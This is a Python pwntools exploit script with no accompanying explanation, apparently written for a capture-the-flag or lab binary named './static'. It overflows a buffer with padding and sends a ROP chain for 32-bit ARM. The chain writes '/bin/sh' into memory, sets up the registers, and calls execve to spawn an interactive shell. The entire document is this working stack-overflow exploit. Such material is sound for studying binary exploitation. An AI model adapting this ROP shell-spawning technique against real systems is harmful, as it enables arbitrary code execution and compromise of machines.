from pwn import *

r = process('./static')

PADDING = 'A' * 0x68
ADDR_OF_BINSH =  0x00079088

shellcode = ""
shellcode += PADDING
shellcode += p32(0x23771)
shellcode += p32(ADDR_OF_BINSH)
shellcode += '/bin'
shellcode += p32(0x4)
shellcode += p32(0x0004392d)

shellcode += '/sh\x00'
shellcode += p32(0x207ab)

shellcode += p32(0x0)
shellcode += p32(0x0004392d)

shellcode += p32(0x0)
shellcode += p32(0x50f0f)

shellcode += p32(ADDR_OF_BINSH)	#r0
shellcode += p32(0x0)				#r1
shellcode += p32(0x0)				#r2
shellcode += p32(0x0)				#r3
shellcode += p32(0x0)				#r4
shellcode += p32(0x0)				#r5
shellcode += p32(0x0)				#r6
shellcode += p32(0xb)				#r7 (syscall #11 is execve)
shellcode += p32(0x10a45)

shellcode += p32(0xb)
shellcode += p32(0x10a45)

f = open('debug_input', 'w')
f.write(shellcode)
f.close()

r.sendline(shellcode)
r.interactive()
